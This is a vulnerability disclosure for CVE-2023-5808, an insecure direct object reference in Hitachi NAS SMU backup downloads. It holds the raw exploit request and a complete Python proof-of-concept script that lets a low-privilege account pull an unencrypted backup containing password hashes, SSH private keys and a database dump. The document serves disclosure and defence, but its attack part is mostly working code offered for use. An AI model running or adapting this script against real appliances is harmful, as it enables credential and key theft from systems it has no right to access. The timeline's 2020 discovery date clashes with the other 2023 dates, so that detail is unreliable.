## CVE-2023-5808
`CVE-2023-5808` is an *Insecure Direct Object Reference* (**IDOR**) in 
vulnerability found in Hitachi NAS' (`HNAS`') *System Management Unit* (`SMU`) 
`Backup & Restore` functionality. This vulnerability affects `SMU` versions 
prior to `14.8.7825.01`.

## Exploitation
This exploit requires the attacker to have control over the credentials of a 
user account that is not `Read-Only` or `Global Administrator`, i.e.:
- `Storage Administrator`
- `Server Administrator`
- `Server + Storage Administrator`

By design, users with the `Global Administrator` role should be able to access 
`SMU`'s `Backup & Restore` functionality, located at `https://<HOSTNAME/FQDN/IP>/mgr/app/action/admin.SmuBackupRestoreAction/eventsubmit_doperform/ignored` 
and send the following request, which would create and download an 
(unencrypted/password-less) backup:

```
GET /mgr/app/template/simple%2CBackupSmuScreen.vm/password/ HTTP/1.1
Host: REDACTED
Cookie: JSESSIONID=REDACTED; JSESSIONIDSSO=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://REDACTED/mgr/app/action/admin.SmuBackupRestoreAction/eventsubmit_doperform/ignored
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```

If the request is successful, the `SMU` responds with the following response 
and starts the download of `smu_2023-04-12_1543+0200.zip`:

```
HTTP/1.1 200 
Cache-Control: PRIVATE
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Strict-Transport-Security: max-age=31536000;includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
P3P: CP="NOI DSP CUR ADMa DEVa TAIa OUR BUS IND UNI COM NAV INT"
Pragma: cache
Content-Disposition: attachment;filename=smu_2023-04-12_1543+0200.zip
Content-Type: application/download
Content-Length: 1831412
Date: Wed, 12 Apr 2023 13:43:15 GMT
Connection: close
Server: SMU

[DATA]
```

However, due to an oversight in `SMU`'s business logic, an attacker with 
access to a `Storage Administrator`, `Server Administrator` or 
`Server + Storage Administrator` account can update the `JSESSIONID` and 
`JSESSIONIDSSO` cookies to match the cookies of the user that they are in 
possession of, allowing them to download the backup archive.

Thus, a script like `CVE-2023-5808.py` could be used to exploit this 
vulnerability:

```python
#!/usr/bin/python3
#
# Title:            Hitachi NAS (HNAS) System Management Unit (SMU) Backup & Restore IDOR Vulnerability 
# CVE:              CVE-2023-5808
# Date:             2023-12-13
# Exploit Author:   Arslan Masood (@arszilla)
# Vendor:           https://www.hitachivantara.com/
# Version:          < 14.8.7825.01
# Tested On:        13.9.7021.04        

import argparse
from datetime import datetime
from os import getcwd

import requests

parser = argparse.ArgumentParser(
    description="CVE-2023-5808 PoC",
    usage="./CVE-2023-5808.py --host <Hostname/FQDN/IP> --id <JSESSIONID> --sso <JSESSIONIDSSO>"
    )

# Create --host argument:
parser.add_argument(
    "--host",
    required=True,
    type=str,
    help="Hostname/FQDN/IP Address. Provide the port, if necessary, i.e. 127.0.0.1:8443, example.com:8443"
    )

# Create --id argument:
parser.add_argument(
    "--id",
    required=True,
    type=str,
    help="JSESSIONID cookie value"
    )

# Create --sso argument:
parser.add_argument(
    "--sso",
    required=True,
    type=str,
    help="JSESSIONIDSSO cookie value"
    )

args = parser.parse_args()

def download_file(hostname, jsessionid, jsessionidsso):
    # Set the filename:
    filename = f"smu_backup-{datetime.now().strftime('%Y-%m-%d_%H%M')}.zip"

    # Vulnerable SMU URL:
    smu_url = f"https://{hostname}/mgr/app/template/simple%2CBackupSmuScreen.vm/password/"

    # GET request cookies
    smu_cookies = {
        "JSESSIONID":       jsessionid,
        "JSESSIONIDSSO":    jsessionidsso
        }

    # GET request headers:
    smu_headers = {
        "User-Agent":                   "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept":                       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":              "en-US,en;q=0.5",
        "Accept-Encoding":              "gzip, deflate",
        "Dnt":                          "1",
        "Referer":                      f"https://{hostname}/mgr/app/action/admin.SmuBackupRestoreAction/eventsubmit_doperform/ignored",
        "Upgrade-Insecure-Requests":    "1",
        "Sec-Fetch-Dest":               "document",
        "Sec-Fetch-Mode":               "navigate",
        "Sec-Fetch-Site":               "same-origin",
        "Sec-Fetch-User":               "?1",
        "Te":                           "trailers",
        "Connection":                   "close"
        }

    # Send the request:
    with requests.get(smu_url, headers=smu_headers, cookies=smu_cookies, stream=True, verify=False) as file_download:
        with open(filename, 'wb') as backup_archive:
            # Write the zip file to the CWD:
            backup_archive.write(file_download.content)

    print(f"{filename} has been downloaded to {getcwd()}")

if __name__ == "__main__":
    download_file(args.host, args.id, args.sso)
```

The justification of the CVSS v3.1 score of 7.6 could be further understood by 
examining the contents of `smu_2023-04-12_1543+0200.zip`:

```
$ tree -a
.
├── adc_replic
│   ├── backup.properties
│   ├── mig_policies
│   │   ├── MIGR_TEST_POL
│   │   │   ├── 1
│   │   │   │   ├── config
│   │   │   │   └── lockfile
│   │   │   ├── config
│   │   │   └── lockfile
│   │   └── next_schedule
│   ├── mig_rules
│   │   └── MIGR_TEST
│   ├── pkgHandler.xml
│   ├── replic_policies
│   ├── replic_rules
│   ├── replic_schedules
│   │   └── next_schedule
│   └── replic_scripts
├── backup.properties
├── mgr
│   ├── axalon.properties
│   ├── backup.properties
│   ├── banner.txt.disabled
│   ├── managedservers.json
│   ├── pkgHandler.xml
│   ├── systemmonitor_1.xml
│   ├── systemmonitor_2.xml
│   └── systemmonitor_3.xml
├── network
│   └── yp.conf
├── postgresql
│   ├── backup.properties
│   ├── config_pgdump.tar
│   ├── pkgHandler.xml
│   └── rolledupstats_pgdump.tar
├── quorumdev2
│   ├── backup.properties
│   ├── CB-HNAS1-CLU
│   │   └── cluster.conf
│   ├── HH-HNAS1-CLU
│   │   └── cluster.conf
│   └── quorumdev2.conf
├── quorumdevice
│   └── backup.properties
├── readyToShip
│   ├── backup.properties
│   ├── pkgHandler.xml
│   ├── ssh_host_dsa_key
│   ├── ssh_host_dsa_key.pub
│   ├── ssh_host_key
│   ├── ssh_host_key.pub
│   ├── ssh_host_rsa_key
│   └── ssh_host_rsa_key.pub
├── server-tools
│   ├── backup.properties
│   ├── ldap.conf.rb
│   ├── massage-commands-for-managed-servers
│   ├── ypcat-group
│   └── ypcat-passwd
├── smu_users
│   ├── backup.properties
│   ├── manager
│   │   └── ssh
│   │       └── known_hosts
│   ├── pkgHandler.xml
│   ├── root
│   │   └── ssh
│   │       └── known_hosts
│   └── shadow
└── tomcat
    ├── backup.properties
    ├── nas.keystore
    └── pkgHandler.xml

25 directories, 49 files
```

The `.zip` archive contains various files regarding the `SMU`'s configuration. 
The files included are (but not limited to):
- `SMU`'s `/etc/shadow` file, containing every user's `CLI` password hashes,
- `PEM DSA`, `PEM RSA`, and `OpenSSH RSA1` private keys,
- `PostgreSQL` database dump.

## Notes
This vulnerability is a "sister vulnerability" to 
[CVE-2023-6538][CVE-2023-6538].

## References
- [CVE-2023-5808][CVE-2023-5808]
- [CVE-2023-6538][CVE-2023-6538]
- [Hitachi Vantara Security Bulletin for CVE-2023-5808][Hitachi Vantara Security Bulletin]

## Timeline
- 2020-04-12 - Vulnerability discovered
- 2023-04-20 - Vulnerability reported to security.vulnerabilities@hitachivantara.com
- 2023-08-11 - Initial CVE number assignment
- 2023-12-06 - CVE numbers re-assigned
- 2023-12-11 - CVE numbers re-assigned
- 2023-12-11 - CVE published
- 2023-12-13 - Public disclosure

[CVE-2023-5808]:                        https://www.cve.org/CVERecord?id=CVE-2023-5808
[CVE-2023-6538]:                        https://www.cve.org/CVERecord?id=CVE-2023-6538
[Hitachi Vantara Security Bulletin]:    https://knowledge.hitachivantara.com/Security/System_Management_Unit_(SMU)_versions_prior_to_14.8.7825.01%2C_used_to_manage_Hitachi_Vantara_NAS_products_are_susceptible_to_unintended_information_disclosure_via_unprivileged_access_to_HNAS_configuration_backup_and_diagnostic_data.
